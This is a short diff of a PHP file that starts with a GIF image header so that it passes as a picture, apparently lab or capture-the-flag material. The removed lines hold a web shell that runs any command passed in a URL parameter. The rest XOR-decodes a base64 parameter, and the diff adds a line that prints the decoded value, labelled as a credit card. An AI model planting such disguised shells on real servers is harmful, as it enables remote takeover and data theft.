@@ -1,7 +1,7 @@
 GIF89a
 <?php
-  $cmd = $_GET['cmd'];
-  echo system($cmd);
+  // $cmd = $_GET['cmd'];
+  // echo system($cmd);
 
   $encoded_base64 = $_GET['code'];
   $XOR_KEY = 'daylaxorkey1234';
@@ -13,4 +13,6 @@ GIF89a
   }
 
   $plain_credit_card = xorString(base64_decode($encoded_base64), $XOR_KEY);
+  echo $plain_credit_card;
+
 ?>
